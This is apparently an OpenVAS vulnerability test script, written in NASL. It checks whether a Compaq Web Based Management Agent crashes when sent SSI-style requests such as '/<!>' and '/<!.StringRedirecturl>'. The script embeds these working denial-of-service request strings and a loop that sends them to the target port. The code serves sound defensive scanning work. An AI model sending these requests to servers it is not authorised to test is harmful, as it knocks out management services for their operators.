# OpenVAS Vulnerability Test
# $Id: compaq_wbem_SSI_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Compaq Web SSI DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003, 2004 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to kill the remote web server by requesting
something like: /<!>
This is probably a Compaq Web Enterprise Management server.

A cracker might use this flaw to forbid you from managing your machines.";

tag_solution = "contact your vendor for a patch,
		or disable this service if you do not use it.";

# References:
#
# Message-ID: <1003117.1055973914093.JavaMail.SYSTEM@sigtrap>
# Date: Thu, 19 Jun 2003 00:05:14 +0200 (CEST)
# From: Ian Vitek <ian.vitek@as5-5-7.bi.s.bonet.se>
# To: <vuln-dev@securityfocus.com>
# Subject: SSI vulnerability in Compaq Web Based Management Agent

if(description)
{
 script_id(11980);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");

 name = "Compaq Web SSI DoS";
 script_name(name);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);

 summary = "<!> crashes Compaq Web Management Agent";
 script_summary(summary);

 script_category(ACT_DENIAL);

 script_copyright("This script is Copyright (C) 2004 Michel Arboi");
 family = "Denial of Service";
 script_family(family);

 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 2301);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
include("http_func.inc");
include("misc_func.inc");
 
port = get_http_port(default:2301);
if (!port) exit(0);	# Also on 2381 - HTTPS

if (! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

# Just in case they just fix the first problem...
n = 0;
u[n++] = "/<!>";
u[n++] = "/<!.StringRedirecturl>";
u[n++] = "/<!.StringHttpRequest=Url>";
u[n++] = "/<!.ObjectIsapiECB>";
u[n++] = "/<!.StringIsapiECB=lpszPathInfo>";

for (i = 0; i < n; i ++)
{
  s = http_open_socket(port);
  if (s)
  {
    r = http_get(port: port, item: u[i]);
    send(socket: s, data: r);
    a = http_recv(socket: s);
    http_close_socket(s);
  }
}

if (http_is_dead(port: port)) security_warning(port);
